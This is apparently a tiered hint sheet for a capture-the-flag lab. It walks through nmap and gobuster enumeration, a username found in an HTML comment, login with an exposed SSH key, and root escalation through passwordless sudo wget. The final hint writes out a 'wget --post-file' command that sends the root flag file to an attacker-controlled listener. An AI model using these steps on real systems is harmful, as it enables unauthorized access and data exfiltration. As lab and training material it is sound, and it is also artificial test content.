author: Omar Tamer
description: Apache web server, developer comment leaks username, exposed SSH key, wget sudo privesc
key_facts: developer comment in source reveals username: jessie
private SSH key exposed in directory
SSH login as jessie using the private key
sudo -l shows wget can run as root no password
wget --post-file exfiltrates root flag to listener

recon.nudge: You need to know what is running on this machine before anything else. What tool discovers open ports and services?
recon.clue: Run an nmap scan against the target — pay attention to which services are running and their versions.
recon.near_solve: Run: nmap -sV -sC TARGET — you will find port 22 (SSH) and port 80 (Apache2). Port 80 is where you start.

enumeration.nudge: You have a web server on port 80. Open it in the browser and look carefully — not just at what is visible but at everything the server is telling you.
enumeration.clue: The Apache default page is showing but something has been added. Look at the HTML source code — developers sometimes leave notes for themselves.
enumeration.near_solve: In the page source you will find a comment that reveals a username: Jessie. Then run gobuster: gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt — find /sitemap and enumerate inside it too.

foothold.nudge: You have a username. Look at what is inside the hidden directories — what would be very valuable to find there?
foothold.clue: Inside the directories under /sitemap there is an exposed SSH private key. Username plus private key — what can you do?
foothold.near_solve: Download the private key, run chmod 600 id_rsa, then: ssh -i id_rsa jessie@TARGET — you land as jessie. User flag is in the home directory.

privesc.nudge: You are in as jessie. What is the first thing to check for privilege escalation on Linux?
privesc.clue: Run sudo -l — jessie can run one binary as root with no password. Think creatively about what that binary can do beyond its normal purpose.
privesc.near_solve: jessie can run /usr/bin/wget as root. Use --post-file to send the root flag to your listener: nc -lvnp 80 on Kali, then on target: sudo wget --post-file=/root/root_flag.txt http://YOUR-TUN0-IP
